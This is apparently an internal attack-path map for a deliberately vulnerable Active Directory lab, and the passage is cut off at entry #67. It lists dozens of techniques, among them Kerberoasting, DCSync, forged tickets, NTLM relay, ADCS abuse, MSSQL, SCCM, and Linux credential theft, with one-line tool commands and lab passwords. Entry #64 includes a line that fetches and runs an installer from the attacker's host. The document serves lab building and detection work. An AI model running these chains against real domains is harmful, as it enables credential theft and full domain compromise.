# CADRE — Complete Attack Path Map (100 Attacks)

**Generated:** 2026-06-03  
**Source:** `docs/internal/plan01-telemetry-catalog/phase1-source-matrix/`  
**Format:** Attack # → Target → Path → Credential Gain → Lateral Chain

> **Status updates applied 2026-06-03 per single-campaign restructure:**
> - ~~WT028~~ ❌ Invalid — SAMR null bind blocked on Server 2025
> - ~~WT031~~ ⏳ Pending relocation — needs user list source
> - ~~WT018-020~~ ❌ Non-functional on Server 2025
> - See [`../CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) for the restructured campaign (8 phases + 4 branches)

---

## Quick Reference

| Category | Count | Numbers | Status |
|----------|-------|---------|--------|
| Kerberos | 8 | 2,3,9,10,11,12,27,33 | ✅ |
| Delegation | 5 | 4,5,6,7,8 | ✅ |
| ACL Abuse | 6 | 13,14,15,16,24,25 | ✅ |
| Coercion | 1 | 17 | ✅ (WT018-020 ❌) |
| Relay | 2 | 21,22 | ✅ |
| ADCS ESC | 14 | 29,50-62 | ✅ |
| GPO Abuse | 1 | 23 | ✅ |
| MSSQL | 5 | 40,41,42,43,44 | ✅ |
| SCCM | 6 | 34,35,36,37,38,39 | ✅ |
| Linux | 5 | 44,45,46,47,48 | ✅ |
| Modern | 2 | 26,49 | ✅ |
| Recon/Other | 3 | 30,32 | ✅ (28❌, 31⏳) |
| **Initial Access** | **6** | **63-68** | ✅ |
| **Post-Exploitation** | **11** | **82-92** | ✅ (93 moved to E) |
| **Campaign total** | **75** | — | — |
| **E — Network Defense** | **14** | **69-81, 93** | Standalone |
| **F — Supply-Chain** | **10** | **F-01–F-10** | Standalone |
| **Total lab** | **99** | — | — |

---

## Kerberos Attacks

> Numbering starts at **#2** — there is no #1 (RC4 Kerberoast is non-viable on Server 2025). The Kerberoast lateral chain (TGS → crack → `chief_command` DA → DCSync #9) is realised via the AES path below.

### #2 — Kerberoasting (AES)
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc03 (low-priv range.local user) |
| **Target** | `svc.sccm` user -- SPN `HTTP/mbr02.range.local` |
| **Encryption** | AES256-only (dc03 is AES-only per CVE-2026-20833) |
| **Tool** | `impacket-GetUserSPNs range.local/user -dc-ip 192.168.77.12` |
| **What you gain** | AES256 TGS hash (harder crack, needs dictionary) -> `s3rv1c3_SCCM!` |
| **Lateral chain** | svc.sccm -> Constrained Delegation (#6), SCCM attacks (#34-39) |
| **Status** | CONFIGURED -- SPN + AES24 set |

### #3 — AS-REP Roasting
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc02 (no domain creds needed) |
| **Target** | `intern_blue` user -- DONT_REQUIRE_PREAUTH set |
| **Tool** | `impacket-GetNPUsers child.cadre.local/ -no-pass -usersfile users.txt` |
| **What you gain** | AS-REP hash -> crack -> `intern_blue` password (low-priv foothold in child domain) |
| **Lateral chain** | intern_blue -> ForceChangePassword on analyst.t2 (ACL) -> child domain escalation |
| **Status** | CONFIGURED |

### #9 — DCSync
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (requires DA context -- obtained via #1, #8, #15, #16, #23, #50, etc.) |
| **Target** | Any DC (dc01, dc02, dc03) |
| **Tool** | `impacket-secretsdump -just-dc cadre.local/chief_command:pass@192.168.77.10` |
| **What you gain** | krbtgt hash + all user hashes + machine account hashes |
| **Lateral chain** | Ultimate domain control -> Golden Ticket (#10), Silver (#11), Diamond (#12), AdminSDHolder (#25), SID History |
| **Status** | POST-EXPLOIT -- prerequisite depends on chain used |

### #10 — Golden Ticket
| Field | Value |
|-------|-------|
| **Starting point** | kali -> any DC (post-DCSync, have krbtgt hash) |
| **Target** | Any domain |
| **Tool** | `Mimikatz kerberos::golden /domain:cadre.local /sid:... /krbtgt:hash /user:DA` |
| **What you gain** | Forged TGT -- access as ANY user for 10+ years |
| **Lateral chain** | Persistent DA -- survive password changes (only krbtgt rotation fixes) |
| **Status** | POST-EXPLOIT -- depends on DCSync |

### #11 — Silver Ticket
| Field | Value |
|-------|-------|
| **Starting point** | kali -> any service (have target service account hash) |
| **Target** | Specific service (CIFS, LDAP, HOST, MSSQLSvc) |
| **Tool** | `Mimikatz kerberos::golden /target:dc01 /service:cifs /rc4:hash` |
| **What you gain** | Forged TGS -- access target service without touching DC |
| **Lateral chain** | Evade DC logon detection; access specific services |
| **Status** | POST-EXPLOIT -- service hash from Kerberoast or DCSync |

### #12 — Diamond Ticket
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (post-DCSync, have krbtgt AES256 key) |
| **Target** | Domain |
| **Tool** | Decrypt legitimate TGT -> modify PAC -> re-encrypt with krbtgt AES key |
| **What you gain** | Forged TGT that appears legitimate (valid timestamps) |
| **Lateral chain** | Stealthier DA persistence than Golden Ticket |
| **Status** | POST-EXPLOIT -- Server 2025 AES krbtgt available by default |

### #27 — SPN Jacking (CVE-2026-25177)
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (analyst_cloud -- has `Validated-SPN` self-write) |
| **Target** | SPN collision with Unicode homoglyphs |
| **Tool** | Register SPN with Cyrillic lookalike chars -> redirect TGS |
| **What you gain** | Intercept TGS intended for another service account |
| **Lateral chain** | Service credential compromise -> lateral to MSSQL |
| **Status** | CONFIGURED -- `SpnSuffixesValidationDisabled=1` |

### #33 — Cross-Forest Kerberoast
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc03 (cadre.local user, via forest trust) |
| **Target** | svc.sccm SPN in range.local |
| **Tool** | `impacket-GetUserSPNs cadre.local/user -target-domain range.local -dc-ip 192.168.77.12` |
| **What you gain** | svc.sccm TGS across trust boundary |
| **Lateral chain** | svc.sccm -> SCCM NAA (#34) -> Domain Admin in range.local |
| **Status** | CONFIGURED -- forest trust established |

---

## Delegation Attacks

### #4 — Unconstrained Delegation
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr01 (child.cadre.local) -- after obtaining code exec (#41) |
| **Target** | mbr01$ -- `TrustedForDelegation=$true` |
| **Tool** | Compromise mbr01 -> dump LSASS -> capture TGTs of users authenticating; or coerce DC (#17) to connect |
| **What you gain** | Captured TGTs of privileged users (DA, service accounts) who authenticate TO mbr01 |
| **Lateral chain** | DA TGT -> DCSync (#9), full child domain control |
| **Status** | CONFIGURED |

### #5 — Constrained Delegation w/ Protocol Transition
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr02 (range.local) -- after compromising mbr02$ |
| **Target** | mbr02$ -- `msDS-AllowedToDelegateTo: cifs/dc03, ldap/dc03` |
| **Tool** | S4U2Self (impersonate any user to self) -> S4U2Proxy (request ticket to dc03) |
| **What you gain** | Service ticket for `cifs/dc03` or `ldap/dc03` as Domain Admin |
| **Lateral chain** | CIFS file access or LDAP modification on dc03 -> DA in range.local -> DCSync |
| **Status** | CONFIGURED |

### #6 — Constrained Delegation w/o Protocol Transition
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr02 (svc.sccm compromised -- from #2 or #33) |
| **Target** | svc.sccm -- `msDS-AllowedToDelegateTo: HTTP/mbr02` (NO TrustedToAuthForDelegation) |
| **Tool** | Must first authenticate to a service -> S4U2Proxy to HTTP/mbr02 |
| **What you gain** | Service ticket to HTTP/mbr02 as any user |
| **Lateral chain** | HTTP to SCCM site -> SCCM admin actions (#37-39) |
| **Status** | CONFIGURED |

### #7 — Resource-Based Constrained Delegation (RBCD)
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr01 (child.cadre.local) -- after obtaining GenericWrite on a computer object |
| **Target** | Attacker-chosen computer (ACL: GenericWrite exists) |
| **Tool** | Write `msDS-AllowedToActOnBehalfOfOtherIdentity` -> S4U2Proxy as any user |
| **What you gain** | Service ticket to target computer as DA |
| **Lateral chain** | Full access to target -> further escalation |
| **Status** | CONFIGURED -- 25 ACEs enable RBCD chains |

### #8 — Shadow Credentials
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (cadre.local) -- ops.redcell user with GenericWrite on dc01$ |
| **Target** | `dc01$` -- add `msDS-KeyCredentialLink` |
| **Tool** | `pyWhisker` / `Whisker` -> add key credential -> get NT hash via device cert auth |
| **What you gain** | `dc01$` machine account NT hash |
| **Lateral chain** | Authenticate as dc01$ -> DCSync (#9) -> full cadre.local compromise |
| **Status** | CONFIGURED |

---

## ACL Abuse Attacks

### #13 — ACL Abuse: WriteDacl
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (Engineering-Cadre member) |
| **Target** | Red-Cadre group |
| **Tool** | WriteDacl on Red-Cadre -> grant self GenericAll -> add self to group |
| **What you gain** | Membership in Red-Cadre |
| **Lateral chain** | Red-Cadre privileges -> Red-Cell functions |
| **Status** | CONFIGURED |

### #14 — ACL Abuse: GenericWrite
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (Cloud-Cadre member) |
| **Target** | Agentic-Cadre group |
| **Tool** | GenericWrite -> Shadow Credentials on group members or targeted Kerberoast |
| **What you gain** | Control over Agentic-Cadre group members |
| **Lateral chain** | Agentic-Cadre privileges -> escalation |
| **Status** | CONFIGURED |

### #15 — ACL Abuse: ForceChangePassword
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (hunter.dfir user) |
| **Target** | `chief_command` user |
| **Tool** | `net user chief.command NewPass! /domain` or ADSI password reset |
| **What you gain** | chief_command's password -> Command-Cadre -> DA |
| **Lateral chain** | DA -> DCSync (#9), full domain control |
| **Status** | CONFIGURED |

### #16 — ACL Abuse: GenericAll on OU
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (analyst.dfir user) |
| **Target** | OU=Command -- GenericAll on OU |
| **Tool** | GenericAll on OU -> inheritable permissions -> control chief.command object |
| **What you gain** | Full control over chief.command -> reset password or Shadow Credentials |
| **Lateral chain** | DA -> DCSync (#9) |
| **Status** | CONFIGURED |

### #24 — gMSA Password Extraction
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (eng.cloud user) |
| **Target** | `gmsaTools$` -- ReadGMSAPassword |
| **Tool** | `DSInternals` / `gMSADumper` -> read msDS-ManagedPassword |
| **What you gain** | gMSA password for gmsaTools$ |
| **Lateral chain** | Access to services running as gMSA -> lateral movement |
| **Status** | CONFIGURED |

### #25 — AdminSDHolder Persistence
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (post-DA) |
| **Target** | AdminSDHolder container |
| **Tool** | Modify AdminSDHolder ACL to grant GenericAll to attacker account |
| **What you gain** | Persistent DA-level access -- survives DA password changes |
| **Lateral chain** | Long-term persistence (SDPROP pushes every 60 min) |
| **Status** | POST-EXPLOIT -- requires DA first |

---

## Coercion Attacks

### #17 — PrinterBug (SpoolSample)
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (low-priv, any domain user) |
| **Target** | dc01 -- MS-RPRN Print Spooler |
| **Tool** | `SpoolSample.exe` / `dementor.py attackerIP dc01` |
| **What you gain** | NTLM authentication from dc01$ |
| **Lateral chain** | Relay to LDAP (#21) -> Shadow Credentials on dc01$ -> DCSync (#9). Or relay to SMB (#22) -> SYSTEM |
| **Status** | CONFIGURED |

### ~~#18 — PetitPotam~~ ❌
> **Non-functional on Server 2025.** `\PIPE\efsrpc` blocked by default. See [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md).
| **Status** | **❌ NON-FUNCTIONAL** |
| **Reason** | EFSR named pipe inaccessible on Server 2025 |
| **Alternative** | Use WT017 (PrinterBug) for confirmed coercion |

### ~~#19 — DFSCoerce~~ ❌
> **Non-functional in detection context.** SMB-pipe DCE-RPC undetectable by Suricata 8.0.5 and Zeek. See [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md).
| **Status** | **❌ NON-FUNCTIONAL** |
| **Reason** | MS-DFSNM uses SMB-encapsulated DCE-RPC — Suricata `dcerpc` keywords don't match `app_proto:"smb"` |
| **Alternative** | Use WT017 (PrinterBug) for confirmed coercion detection |

### ~~#20 — ShadowCoerce~~ ❌
> **Non-functional on Server 2025.** MS-FSRVP service not available. See [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md).
| **Status** | **❌ NON-FUNCTIONAL** |
| **Reason** | FSRVP (File Server VSS Agent) not available on Server 2025 DCs |
| **Alternative** | Use WT017 (PrinterBug) for confirmed coercion detection |

---

## Relay Attacks

### #21 — NTLM Relay to LDAP
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (after coercion #17-20 captures NTLM auth) |
| **Target** | dc01 -- LDAP (signing NOT required) |
| **Tool** | `ntlmrelayx.py -t ldap://dc01.cadre.local --shadow-credentials` |
| **What you gain** | Shadow Credentials on dc01$ (using dc01$'s OWN relayed auth) |
| **Lateral chain** | dc01$ NT hash -> DCSync (#9) |
| **Status** | CONFIGURED |

### #22 — NTLM Relay to SMB
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr02 (after coercion captures NTLM auth) |
| **Target** | mbr02 -- SMB (signing disabled) |
| **Tool** | `ntlmrelayx.py -t smb://mbr02.range.local` |
| **What you gain** | SYSTEM on mbr02 |
| **Lateral chain** | mbr02 control -> SCCM (#34-39), MSSQL (#42) |
| **Status** | CONFIGURED |

---

## GPO Abuse

### #23 — GPO Abuse (Vulnerable-GPO)
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc01 (analyst.cloud -- GpoEditDeleteModifySecurity) |
| **Target** | Vulnerable-GPO linked to OU=Command (contains chief.command) |
| **Tool** | Modify GPO -> add scheduled task -> triggers on all OU=Command members |
| **What you gain** | Code execution as chief.command -> DA |
| **Lateral chain** | DCSync (#9) |
| **Status** | CONFIGURED |

---

## MSSQL Attacks

### #40 — MSSQL Linked Server Hop (Windows)
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr01 (child.cadre.local) -- connect via SA or analyst.t1 |
| **Target** | mbr01 -> linked server to mbr02 (range.local) |
| **Tool** | `OPENQUERY("MBR02", 'SELECT 1; EXEC xp_cmdshell "whoami"')` |
| **What you gain** | Code execution on mbr02 via linked server + xp_cmdshell |
| **Lateral chain** | mbr02 compromise -> SCCM (#34-39), CLR (#42), cross-forest |
| **Status** | CONFIGURED |

### #41 — MSSQL xp_cmdshell
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr01 (SA or analyst.t1 with IMPERSONATE) |
| **Target** | mbr01 MSSQLSERVER (xp_cmdshell enabled) |
| **Tool** | `EXEC xp_cmdshell 'whoami'` |
| **What you gain** | OS command execution as `NT SERVICE\MSSQLSERVER` |
| **Lateral chain** | mbr01 code exec -> unconstrained delegation (#4) -> capture TGTs |
| **Status** | CONFIGURED |

### #42 — MSSQL CLR Assembly
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr02 (range.local) |
| **Target** | mbr02 MSSQL (CLR enabled + TRUSTWORTHY ON) |
| **Tool** | Create malicious CLR assembly -> code in MSSQL process |
| **What you gain** | Code execution in MSSQL context on mbr02 |
| **Lateral chain** | SYSTEM on mbr02 -> SCCM takeover, domain lateral |
| **Status** | CONFIGURED |

### #43 — MSSQL Impersonation
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr01 (analyst.t1 -- has IMPERSONATE on sa) |
| **Target** | mbr01 MSSQL -- `EXECUTE AS LOGIN = 'sa'` |
| **Tool** | `EXECUTE AS LOGIN = 'sa';` -> full SA access |
| **What you gain** | SA (sysadmin) on mbr01 MSSQL |
| **Lateral chain** | SA -> xp_cmdshell (#41), linked server hops (#40, #44) |
| **Status** | CONFIGURED |

### #44 — MSSQL-on-Linux Lateral
| Field | Value |
|-------|-------|
| **Starting point** | kali -> linux01 (via mbr01 linked server to LINUX01) |
| **Target** | linux01 MSSQL (cadre.local) |
| **Tool** | `OPENQUERY("LINUX01", 'SELECT name FROM sys.databases')` |
| **What you gain** | Database reconnaissance on linux01 (xp_cmdshell unavailable on SQL Linux) |
| **Lateral chain** | Database recon -> SSSD ticket extraction (#45), keytab abuse (#46), Podman escape (#48) |
| **Status** | CONFIGURED |

---

## SCCM Attacks (All Deferred)

### #34 — SCCM NAA Credential Extraction
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr02 |
| **Target** | svc.naa (DA in range.local) |
| **Tool** | Read NAA from WMI `SMS_SCI_Reserved` |
| **Gain** | `N@A_s3rv1c3!` -> Domain Admin range.local |
| **Chain** | DCSync dc03 |
| **Status** | **CONFIGURED** -- SCCM site CAD running on mbr02 |

### #35 — SCCM PXE Boot Abuse
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr02 |
| **Target** | PXE media (no boot password) |
| **Tool** | `PXEThief` -> capture task sequence -> extract NAA |
| **Gain** | Same as #34 -- DA range.local |
| **Status** | **CONFIGURED** -- SCCM site CAD running on mbr02 |

### #36 — SCCM Client Push Relay
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr02 |
| **Target** | Auto client push + SMB relay |
| **Tool** | Relay NTLM from client push -> SMB |
| **Gain** | SYSTEM on mbr02 |
| **Chain** | Full SCCM control |
| **Status** | **CONFIGURED** -- SCCM site CAD running on mbr02 |

### #37 — SCCM CMPivot Abuse
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr02 |
| **Target** | All SCCM clients |
| **Tool** | CMPivot queries |
| **Gain** | Recon data on all domain machines |
| **Status** | **CONFIGURED** -- SCCM site CAD running on mbr02 |

### #38 — SCCM Application Deployment
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr02 |
| **Target** | All clients via SCCM collection |
| **Tool** | Deploy malicious app |
| **Gain** | SYSTEM on all SCCM clients |
| **Status** | **CONFIGURED** -- SCCM site CAD running on mbr02 |

### #39 — SCCM Site Server Takeover
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr02 |
| **Target** | SCCM site server |
| **Tool** | SCCM Full Admin -> deploy local script |
| **Gain** | SYSTEM on mbr02 |
| **Status** | **CONFIGURED** -- SCCM site CAD running on mbr02 |

---

## ADCS ESC Attacks (#50-62)

All target CA `cadre-CA` on `dc01.cadre.local`. Starting credential: low-priv domain user (e.g., `analyst.dfir`). Enrollment granted to `Domain Users`.

### #50 — ESC1: Enrollee Supplies Subject + Client Auth
| Field | Value |
|-------|-------|
| **Template** | CADRE-ESC1 |
| **Core technique** | `certipy req -ca cadre-CA -template CADRE-ESC1 -upn chief_command@cadre.local` |
| **Certificate** | SAN=chief_command@cadre.local, EKU=Client Auth, exportable key |
| **Gain** | DA authentication |
| **Chain** | DCSync (#9) |
| **Status** | **CONFIGURED** -- CA running, ESC1 template published (verified by 08-adcs-verify.yml) |

### #51 — ESC2: Any Purpose EKU
| Field | Value |
|-------|-------|
| **Template** | CADRE-ESC2 |
| **Core technique** | `certipy req -ca cadre-CA -template CADRE-ESC2` |
| **Certificate** | Any Purpose EKU (code signing + client auth) |
| **Gain** | Certificate usable for multiple purposes |
| **Chain** | Code execution via signing, client auth |
| **Status** | **CONFIGURED** -- CA running, ESC2 template published |

### #52 — ESC3: Certificate Request Agent + Enrollment Agent
| Field | Value |
|-------|-------|
| **Template** | CADRE-ESC3-Agent + CADRE-ESC3-Target |
| **Core technique** | Enroll Agent cert -> use to request cert on behalf of DA |
| **Certificate** | DA certificate via on-behalf-of enrollment |
| **Gain** | DA authentication |
| **Chain** | DCSync (#9) |
| **Status** | **CONFIGURED** -- CA running, ESC3-Agent + ESC3-Target published |

### #53 — ESC4: Writable Template ACL
| Field | Value |
|-------|-------|
| **Template** | CADRE-ESC4 |
| **Core technique** | Engineering-Cadre WriteDacl -> modify template -> add SAN -> enroll as DA |
| **Certificate** | DA certificate (same result as ESC1) |
| **Gain** | DA authentication |
| **Chain** | DCSync (#9) |
| **Status** | **CONFIGURED** -- CA running, ESC2 template published |

### #54 — ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on CA
| Field | Value |
|-------|-------|
| **Template** | ANY published template |
| **Core technique** | `certutil -setreg CA\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2` -- add SAN via `-attrib` |
| **Certificate** | Certificate with arbitrary SAN using ANY template |
| **Gain** | DA authentication |
| **Chain** | DCSync (#9) |
| **Status** | **CONFIGURED** -- ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 verified |

### #55 — ESC7: CA Manager Permission
| Field | Value |
|-------|-------|
| **Template** | ANY |
| **Core technique** | `lead.engineering` has ManageCA -> approve pending requests |
| **Certificate** | Any user cert after approving pending request |
| **Gain** | DA authentication |
| **Chain** | DCSync (#9) |
| **Status** | **CONFIGURED** -- CA running, lead_engineering ManageCA verified |

### #56 — ESC8: HTTP Web Enrollment (NTLM Relay)
| Field | Value |
|-------|-------|
| **Template** | Web Enrollment |
| **Core technique** | Coerce dc01 auth (#17-20) -> relay to `http://dc01/certsrv/certfnsh.asp` |
| **Certificate** | Certificate for relayed machine (dc01$) |
| **Gain** | dc01$ machine cert -> DCSync (#9) |
| **Chain** | DCSync (#9) |
| **Status** | **CONFIGURED** -- /CertSrv Web Enrollment app pool active (NetworkService) |

### #57 — ESC9: No Security Extension
| Field | Value |
|-------|-------|
| **Template** | CADRE-ESC9 |
| **Core technique** | Enroll cert without szOID_NTDS_CA_SECURITY_EXT -> change own UPN to DA's -> auth as DA |
| **Certificate** | Cert without security extension |
| **Gain** | DA by UPN manipulation |
| **Chain** | DCSync (#9) |
| **Status** | **CONFIGURED** -- CA running, ESC2 template published |

### #58 — ESC10: Weak Certificate Mapping
| Field | Value |
|-------|-------|
| **Template** | ANY (relies on registry, not template) |
| **Core technique** | `StrongCertificateBindingEnforcement=0` + `CertificateMappingMethods=31` -- enroll cert with SAN = target UPN |
| **Certificate** | Any cert with SAN = DA UPN |
| **Gain** | Authentication as any user with matching UPN in SAN |
| **Chain** | DCSync (#9) |
| **Status** | **CONFIGURED** -- all 3 DCs verified PASS |

### #59 — ESC11: RPC Interface without Integrity
| Field | Value |
|-------|-------|
| **Template** | ANY |
| **Core technique** | Coerce dc01 auth -> relay to ICPR RPC port 445 (IF_ENFORCEENCRYPTICERTREQUEST not set) |
| **Certificate** | Certificate for relayed machine account |
| **Gain** | Machine cert -> DCSync |
| **Chain** | DCSync (#9) |
| **Status** | **CONFIGURED** -- ESC11 ICPR enabled, integrity verification removed |

### #60 — ESC13: Issuance Policy -> Group Mapping
| Field | Value |
|-------|-------|
| **Template** | CADRE-ESC13 |
| **Core technique** | Enroll cert with issuance policy OID -> Kerberos maps policy to Command-Cadre group |
| **Certificate** | Cert with `1.3.6.1.4.1.311.21.55.1` policy |
| **Gain** | DA group membership via certificate auth |
| **Chain** | DCSync (#9) |
| **Status** | **CONFIGURED** -- CA running, ESC2 template published |

### #61 — ESC14: Weak Explicit Mapping
| Field | Value |
|-------|-------|
| **Template** | CADRE-ESC14 |
| **Core technique** | GenericWrite -> write `altSecurityIdentities` on target -> use own cert to auth as target |
| **Certificate** | Enrolled cert -> mapped to target via altSecurityIdentities |
| **Gain** | Authentication as target user |
| **Chain** | Escalate to high-priv user |
| **Status** | **CONFIGURED** -- CA running, ESC2 template published |

### #62 — ESC15 (EKUwu): v1 Template Application Policy
| Field | Value |
|-------|-------|
| **Template** | CADRE-ESC15 (v1 schema) |
| **Core technique** | v1 templates use `msPKI-RA-Application-Policies` (not EKU) -- some tools miss this. Enrollee supplies subject. |
| **Certificate** | Cert with Application Policy = Client Auth, SAN = DA UPN |
| **Gain** | DA authentication (same as ESC1) |
| **Chain** | DCSync (#9) |
| **Status** | **BROKEN** -- Server 2025 PKI rejects v1 templates (cannot deploy) |

---

## Linux Attacks

### #45 — SSSD Ticket Extraction
| Field | Value |
|-------|-------|
| **Starting point** | kali -> linux01 (post-compromise from #44 or PoP) |
| **Target** | linux01 -- `/var/lib/sss/secrets/secrets.ldb` + `/tmp/krb5cc*` |
| **Tool** | Extract Kerberos tickets from SSSD cache |
| **What you gain** | TGT/TGS of users who authenticated to linux01 |
| **Lateral chain** | Domain credential reuse -> authenticate as cached users |
| **Status** | CONFIGURED -- SSSD domain-joined |

### #46 — Keytab Abuse
| Field | Value |
|-------|-------|
| **Starting point** | kali -> linux01 (post-compromise) |
| **Target** | `/var/opt/mssql/secrets/mssql.keytab` |
| **Tool** | `klist -ket mssql.keytab` -> extract NTHASH/AES keys |
| **What you gain** | Password-equivalent for MSSQLSvc/linux01 principal (svc.ldap keytab) |
| **Lateral chain** | Kerberos auth as MSSQL principal -> domain lateral |
| **Status** | **CONFIGURED** -- keytab exists at /var/opt/mssql/secrets/mssql.keytab (verified by 09-sql-wsus-verify.yml) |

### #47 — NFS Kerberos Mount Abuse
| Field | Value |
|-------|-------|
| **Starting point** | kali -> linux01 (post-compromise, with Kerberos ticket) |
| **Target** | linux01 -- `/exports/secure-share` (sec=krb5p) |
| **Tool** | Mount NFS with stolen ticket -> access files as Kerberos principal |
| **What you gain** | Access to kerberized NFS share -> credential files |
| **Lateral chain** | Data exfiltration, credential discovery |
| **Status** | CONFIGURED -- fallback to host/ principal works |

### #48 — Podman Container Escape
| Field | Value |
|-------|-------|
| **Starting point** | linux01 (local access required) |
| **Target** | `cadre-monitor` container (`--privileged --pid=host`) |
| **Tool** | Container -> `/proc/1/root` -> host filesystem |
| **What you gain** | Root on linux01 |
| **Lateral chain** | Root -> keytabs, SSSD, MSSQL, domain credential theft |
| **Status** | CONFIGURED |

---

## Modern Attacks

### #26 — dMSA / BadSuccessor (CVE-2025-53779)
| Field | Value |
|-------|-------|
| **Starting point** | kali -> dc03 (adversary.lead user -- GenericWrite on dmsa) |
| **Target** | `dmsaPrivService$` -- write `msDS-ManagedPasswordPreviousId` = SID of dc03$ |
| **Tool** | Write prev password ID -> extract dc03 machine key via dMSA |
| **What you gain** | dc03$ machine account credential |
| **Lateral chain** | DCSync range.local -> full forest control |
| **Status** | CONFIGURED |

### #49 — Virtual Smart Card Enrollment
| Field | Value |
|-------|-------|
| **Starting point** | kali -> mbr02 (range.local) |
| **Target** | mbr02 VSC CA |
| **Tool** | Enroll VSC certificate -> use for authentication |
| **What you gain** | Certificate-based credential bound to user |
| **Lateral chain** | ADCS exploitation chain, bypass password requirements |
| **Status** | CONFIGURED |

---

## Recon / Other Attacks

### ~~#28 — Null Session Enumeration~~
> **❌ INVALID — Removed.** Server 2025 `RestrictAnonymousSAM=1` blocks SAMR null binds. See [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md).
| **Starting point** | kali -> dc02 (no creds) |
| **Target** | dc02 -- `RestrictAnonymous=0` (insufficient — SAM=1 blocks) |
| **Tool** | `enum4linux -U dc02` / `rpcclient -U "" -N dc02` |
| **Gain** | None — blocked |
| **Status** | **❌ INVALID — NOT FUNCTIONAL** |

### #29 — CertPotato (DCOM->cert)
| **Starting point** | mbr01 -> dc01 |
| **Target** | dc01 -- IIS + DCOM + ADCS Web Enrollment |
| **Tool** | DCOM -> trigger cert request as SYSTEM -> relay to ADCS |
| **Gain** | SYSTEM-level cert from cadre-CA |
| **Chain** | Certificate-based auth -> DA escalation |
| **Status** | **CONFIGURED** -- IIS CADRE-CertPotato pool on mbr01, Web Enrollment on dc01 active |

### #30 — WSUS Abuse
| **Starting point** | kali -> mbr02 |
| **Target** | WSUS server -- inject malicious update |
| **Tool** | Modify WSUS config -> fake update |
| **Gain** | Code exec on all WSUS clients |
| **Chain** | Lateral to all domain machines |
| **Status** | CONFIGURED |

### ~~#31 — Password Spray~~
> **⏳ PENDING RELOCATION.** Valid technique — needs a user list source. See [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md).
| **Starting point** | kali -> dc01 (needs user list) |
| **Target** | All domain users |
| **Tool** | `kerbrute passwordspray` / `DomainPasswordSpray` |
| **Gain** | Valid low-priv creds from weak leetspeak passwords |
| **Chain** | Initial foothold -> enables other attacks |
| **Status** | **⏳ PENDING — AWAITING REINSERTION** |

### #32 — Token Impersonation
| **Starting point** | mbr01 -> dc01 |
| **Target** | mbr01 (unconstrained delegation) -> capture tokens |
| **Tool** | `RogueWinRM` / `Incognito` on compromised mbr01 |
| **Gain** | Impersonated tokens of privileged users |
| **Chain** | DA tokens -> DCSync (#9) |
| **Status** | CONFIGURED -- mbr01$ TrustedForDelegation=True |

---

## Initial Access Attacks (WT#63-68)

Target: mbr01. Attacker hosts payloads on Kali HTTP :8080. Victim (`analyst.cloud`) downloads and opens.

### #63 — Malicious LNK
| Field | Value |
|-------|-------|
| **Starting point** | Kali -> mbr01 (HTTP delivery) |
| **Target** | mbr01 user downloads LNK via browser |
| **Tool** | PowerShell `WScript.CreateShortcut` (on Kali) |
| **Gain** | Code exec on mbr01 as victim user |
| **Chain** | LSASS dump (#82) -> credential theft -> GPO abuse (#23) -> DA |
| **Status** | SCRIPT WRITTEN |

### #64 — MSI Installer
| Field | Value |
|-------|-------|
| **Starting point** | Kali -> mbr01 (HTTP delivery) |
| **Target** | `msiexec /quiet /i http://kali:8080/evil.msi` |
| **Tool** | WiX toolset (on Kali) -> custom action |
| **Gain** | Code exec on mbr01 as victim user |
| **Chain** | LSASS dump (#82) -> DA |
| **Status** | SCRIPT WRITTEN |

### #65 — CHM Execution
| Field | Value |
|-------|-------|
| **Starting point** | Kali -> mbr01 (HTTP delivery) |
| **Target** | `hh.exe` opens malicious .chm |
| **Tool** | HTML Help Workshop (on Kali) builds .chm with embedded VBS |
| **Gain** | Code exec on mbr01 via hh.exe |
| **Chain** | LSASS dump (#82) -> DA |
| **Status** | SCRIPT WRITTEN |

### #66 — HTML Smuggling
| Field | Value |
|-------|-------|
| **Starting point** | Kali -> mbr01 (browser to HTTP) |
| **Target** | Browser downloads payload via JS Blob |
| **Tool** | Python smuggling script |
| **Gain** | Payload delivered past web proxy filters |
| **Chain** | Code exec -> LSASS dump (#82) -> DA |
| **Status** | SCRIPT WRITTEN |

### #67 — AutoIt3 Execution
| Field | Value |
|-------|-------|
| **Starting point** | Kali -> mbr01 (HTTP delivery) |
